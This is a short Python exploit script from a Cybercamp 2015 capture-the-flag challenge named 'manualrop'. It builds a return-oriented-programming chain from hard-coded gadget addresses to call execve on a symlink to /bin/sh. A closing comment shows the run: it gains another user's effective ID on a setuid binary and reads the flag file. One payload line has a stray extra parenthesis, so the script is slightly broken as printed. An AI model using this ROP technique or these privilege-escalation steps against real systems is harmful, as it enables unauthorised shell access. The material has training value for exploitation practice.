#!/usr/bin/python
#
# Exploiting 04 - manualrop
# Cybercamp 2015
# @danigargu
#

from struct import pack

inc_eax      = 0x485a5b # inc eax ; ret
pop_rdi      = 0x400c00 # pop rdi ; ret
pop_rdx_rsi  = 0x41a249 # pop rdx ; pop rsi ; ret
xchg_eax_edi = 0x425354 # xchg eax, edi ; ret
syscall      = 0x44C705 # syscall ; ret
module_str   = 0x486FB2 # module str

payload = "A" * 40 # junk
payload += pack("<QQ",  pop_rdi, 0x3b)        # RDI = 0x3b
payload += pack("<Q",   xchg_eax_edi)         # EAX = 0x3b
payload += pack("<QQ",  pop_rdi, module_str)) # RDI = &module_str
payload += pack("<QQQ", pop_rdx_rsi, 0, 0)    # RDI, RSI = 0,0
payload += pack("<Q",   syscall)              # execve("/bin/sh", 0, 0)

print payload

"""
$ cd /tmp
$ mkdir .lol
$ cd .lol
$ python exp4.py >test
$ ln -s /bin/sh module
$ /home/user1/manualrop test 113
$ id
uid=1001(user1) gid=1001(user1) euid=1000(user2) egid=1000(user2) groups=1000(user2),1001(user1)
$ cat /home/user1/flag.txt
11ab926b804ffbd63894711ebbaf74e36f2d6f2c778abfa88ca041a2fd378896
"""

